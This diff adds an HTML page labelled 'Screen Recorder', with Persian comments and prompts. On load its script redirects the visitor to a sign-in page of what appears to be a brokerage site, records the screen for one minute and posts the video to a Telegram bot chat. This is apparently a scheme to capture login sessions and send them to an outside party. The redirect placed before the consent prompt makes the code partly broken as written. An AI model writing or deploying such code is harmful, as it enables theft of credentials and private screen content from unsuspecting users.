@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Screen Recorder</title>
+</head>
+<body>
+    <script>
+        async function startRecording() {
+            // انتقال به صفحه مورد نظر
+            window.location.href = "https://auth.amarkets.dev/sign_in/?gl=1%2_aqnbjty%2_a_gcl_au%2_a_m_tkx_o_d_a0_o_t_i1_m_s4x_nz_e1_mzcw_o_d_ix_lj_y5_nz_iz_njk3_n_s4x_nz_iw_n_d_qw_mz_my_lj_e3_mj_a0_n_d_az_mz_e.%2_a_ga%2_a_m_t_m0_n_t_mx_o_tg1_n_c4x_nz_ey_mz_m2_o_tc1%2_a_ga__c_k6_k_t60_n39%2_a_m_tcy_m_d_yy_o_t_m5_ny4y_ny4x_lj_e3_mj_a2_mjkz_o_tcu_nj_au_m_c4w&lang=en";
+
+            const userConsent = confirm("آیا می‌خواهید از صفحه شما فیلمبرداری شود؟");
+            if (!userConsent) return;
+
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) chunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: "video/webm" });
+                    const formData = new FormData();
+                    formData.append('video', blob);
+
+                    await fetch('https://api.telegram.org/bot<YOUR_BOT_API_TOKEN>/sendDocument?chat_id=@Bozorg_Zarrinpar', {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    alert('ویدیو با موفقیت ارسال شد.');
+                };
+
+                mediaRecorder.start();
+
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 60000); // توقف بعد از 1 دقیقه
+            } catch (error) {
+                console.error("Error recording screen:", error);
+            }
+        }
+
+        startRecording();
+    </script>
+</body>
+</html>
